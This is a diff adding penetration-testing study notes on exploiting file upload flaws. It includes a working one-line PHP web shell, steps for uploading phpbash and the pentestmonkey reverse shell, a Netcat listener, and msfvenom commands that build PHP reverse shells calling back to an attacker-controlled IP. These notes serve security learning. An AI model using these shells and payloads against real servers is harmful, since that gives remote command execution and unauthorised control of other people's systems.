@@ -30,3 +30,71 @@
 
 ### 5. **Exploiting the Vulnerability**
    - After confirming file upload vulnerability, the next step is to exploit it for remote control of the server by uploading a malicious script.
+
+## Exploitation Techniques
+
+### Web Shells
+   - Web shells are scripts that provide a way to interact with the backend server.
+   - Examples include **phpbash**, a terminal-like PHP web shell, and others available in **SecLists**.
+   - Upload the web shell through the vulnerable upload feature and access it via its link:
+     ```
+     http://SERVER_IP:PORT/uploads/phpbash.php
+     ```
+   - Custom Web Shell Example:
+     ```php
+     <?php system($_REQUEST['cmd']); ?>
+     ```
+     - Use the `?cmd=` parameter to execute commands (e.g., `?cmd=id`).
+     - For browsers, use source-view (`Ctrl+U`) for better output formatting.
+
+### Reverse Shells
+   - Reverse shells allow the server to connect back to the attacker's machine, providing interactive control.
+   - Tools like **pentestmonkey PHP reverse shell** or scripts from **SecLists** can be used.
+   - Edit the script with your IP/PORT:
+     ```php
+     $ip = 'OUR_IP';     // CHANGE THIS
+     $port = OUR_PORT;   // CHANGE THIS
+     ```
+   - Start a Netcat listener:
+     ```
+     nc -lvnp OUR_PORT
+     ```
+   - Upload the script and execute it via the web app:
+     ```
+     http://SERVER_IP:PORT/uploads/reverse.php
+     ```
+   - Example reverse shell generation with `msfvenom`:
+     ```
+     msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
+     ```
+
+### Writing Custom Scripts
+   - Custom scripts can be written in the web server's language using native functions like `system()` in PHP or `eval()` in ASP.NET.
+   - Use `msfvenom` for generating scripts for various languages:
+     ```
+     msfvenom -p payload LHOST=OUR_IP LPORT=OUR_PORT -f format > shell.ext
+     ```
+
+## Tools Overview
+
+### Pentestmonkey
+   - **What It Is**: A collection of tools and scripts designed for penetration testing, including reliable reverse shells.
+   - **Key Usage**:
+     - Edit `php-reverse-shell.php` to include your IP and port.
+     - Upload to the vulnerable server and access its link to gain shell access.
+
+### Msfvenom
+   - **What It Is**: A Metasploit tool used to generate payloads, including reverse and bind shells, for various platforms and languages.
+   - **Key Usage**:
+     - Syntax:
+       ```
+       msfvenom -p payload LHOST=OUR_IP LPORT=OUR_PORT -f format > outputfile
+       ```
+     - Example for PHP:
+       ```
+       msfvenom -p php/reverse_php LHOST=192.168.1.10 LPORT=4444 -f raw > reverse.php
+       ```
+     - Payloads and formats:
+       - `-p`: Specify the payload (e.g., `php/reverse_php`).
+       - `-f`: Format (e.g., `raw`, `exe`, `elf`).
+
